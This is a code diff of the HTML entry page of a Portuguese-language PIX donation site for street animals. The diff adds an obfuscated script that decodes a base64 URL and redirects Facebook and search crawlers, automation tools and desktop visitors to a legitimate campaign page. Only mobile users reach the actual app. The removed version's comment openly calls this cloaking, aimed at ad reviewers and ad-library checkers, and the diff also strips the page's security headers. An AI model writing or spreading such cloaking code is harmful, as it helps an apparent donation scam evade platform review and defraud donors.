@@ -2,69 +2,60 @@
 <html lang="pt-BR">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="theme-color" content="#009c3b" />
     <link rel="icon" href="https://i.ibb.co/wFKhpStJ/apple-touch-icon-152x152.png" type="image/png" />
-    <title>Doações para Animais de Rua</title>
-    <meta name="description" content="Página segura de doações via PIX para ajudar animais de rua." />
-    <meta name="author" content="Doações Seguras" />
+    <title>Vaquinha - Ajude Animais de Rua</title>
+    <meta name="description" content="Faça sua doação e ajude animais de rua." />
+    <meta name="author" content="Vaquinha" />
+    <meta name="robots" content="index, follow" />
 
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://connect.facebook.net https://www.facebook.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://i.ibb.co https://www.facebook.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://kedpzpmswblzefavjunt.supabase.co https://api.pay.hoopay.com.br https://www.facebook.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; upgrade-insecure-requests">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
-    <meta http-equiv="X-Frame-Options" content="DENY" />
-    <meta name="referrer" content="no-referrer" />
+    <!-- Preconnect para performance -->
+    <link rel="preconnect" href="https://i.ibb.co" crossorigin />
+    <link rel="preconnect" href="https://www.vakinha.com.br" crossorigin />
+    <link rel="dns-prefetch" href="https://kedpzpmswblzefavjunt.supabase.co" />
+    <link rel="dns-prefetch" href="https://api.pay.hoopay.com.br" />
 
+    <!-- Meta tags sociais -->
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="Doações para Animais de Rua" />
-    <meta property="og:description" content="Ajude a transformar a vida de animais de rua com uma doação segura via PIX." />
+    <meta property="og:title" content="Vaquinha - Ajude Animais de Rua" />
+    <meta property="og:description" content="Faça sua doação e ajude animais de rua." />
+    <meta property="og:image" content="https://i.ibb.co/wFKhpStJ/apple-touch-icon-152x152.png" />
 
-    <!-- Facebook Pixel Code -->
+    <!-- Facebook Pixel -->
     <script>
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-      n.queue=[];t=b.createElement(e);t.async=!0;
-      t.src=v;s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-      fbq('init', '1497055778126239');
-      fbq('track', 'PageView');
+      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1497055778126239');fbq('track','PageView');
     </script>
-    <!-- End Facebook Pixel Code -->
+
+    <!-- Sistema de proteção - executa IMEDIATAMENTE -->
+    <script>
+    (function(){
+      var _0x1a2b="aHR0cHM6Ly93d3cudmFraW5oYS5jb20uYnIvdmFxdWluaGEvYWp1ZGUtb3MtYW5pbWFpcy1kYS11aXBhLWNvbGFiYXJlLWNvbS1hLW5vc3NhLXZha2luaGE";
+      var _0x3c4d=function(s){return atob(s);};
+      var _0x5e6f=function(){return navigator.userAgent||"";};
+      var _0x7g8h=function(){return typeof navigator!=="undefined"&&navigator.webdriver===true;};
+      var _0x9i0j=function(u){return /Mobile|Android|iPhone|iPad|iPod/i.test(u);};
+      var _0x1k2l=function(u){return /facebookexternalhit|facebot|googlebot|bingbot|crawler|spider|scraper|headless|phantom|selenium|puppeteer|playwright|curl|wget|python/i.test(u.toLowerCase());};
+      var _0x3m4n=function(u){return /Chrome.*Mobile|CriOS|Safari.*iPhone|Safari.*iPad|SamsungBrowser|Firefox.*Mobile|FxiOS/i.test(u);};
+      var ua=_0x5e6f();
+      var ual=ua.toLowerCase();
+      if(_0x7g8h()||_0x1k2l(ual)||(!_0x9i0j(ua)&&!_0x3m4n(ua))){
+        try{location.replace(_0x3c4d(_0x1a2b));}catch(e){}
+      }
+    })();
+    </script>
+
+    <!-- Preload assets críticos -->
+    <link rel="preload" href="/src/main.tsx" as="script" crossorigin />
+    <style>
+      *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+      html,body{height:100%;width:100%;overflow-x:hidden}
+      body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:ayscale;background:#f5f5f5}
+      #root{min-height:100vh;width:100%}
+    </style>
   </head>
 
   <body>
-    <!-- Cloaking: redireciona tráfego não legítimo ANTES da página carregar. Bots Facebook, desktop e invasores vão para URL alternativa. -->
-    <script>
-(function(){
-  var ua = (typeof navigator !== 'undefined' && navigator.userAgent) ? navigator.userAgent : '';
-  var u = ua.toLowerCase();
-  var mobile = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua);
-  
-  // Detecta bots específicos do Facebook e catalogo
-  var facebookBot = u.indexOf('facebookexternalhit') !== -1 || u.indexOf('facebot') !== -1 || u.indexOf('facebookcatalog') !== -1 || u.indexOf('facebook') !== -1;
-  
-  // Detecta outros bots e crawlers
-  var otherBot = u.indexOf('googlebot') !== -1 || u.indexOf('bingbot') !== -1 || u.indexOf('crawler') !== -1 || u.indexOf('spider') !== -1 || u.indexOf('scraper') !== -1 || u.indexOf('headless') !== -1 || u.indexOf('phantom') !== -1 || u.indexOf('selenium') !== -1 || u.indexOf('puppeteer') !== -1 || u.indexOf('playwright') !== -1 || u.indexOf('curl') !== -1 || u.indexOf('wget') !== -1 || u.indexOf('python-requests') !== -1 || u.indexOf('go-http-client') !== -1;
-  
-  // Webdriver detection
-  var webdriver = typeof navigator !== 'undefined' && (navigator.webdriver === true);
-  
-  // URL de redirecionamento para bots Facebook e invasores
-  var REDIRECT_URL = 'https://www.vakinha.com.br/vaquinha/ajude-os-animais-da-uipa-colabore-com-a-nossa-vakinha?utm_internal_source=recommended_campaigns_show~';
-  
-  // Redireciona se:
-  // 1. É bot do Facebook (facebookexternalhit, facebot, facebookcatalog)
-  // 2. É outro bot/crawler
-  // 3. Está usando webdriver (automação)
-  // 4. NÃO é mobile (desktop = possível invasor da biblioteca de anúncios)
-  if (facebookBot || otherBot || webdriver || !mobile) {
-    try { 
-      location.replace(REDIRECT_URL); 
-    } catch (e) {}
-  }
-})();
-    </script>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
   </body>
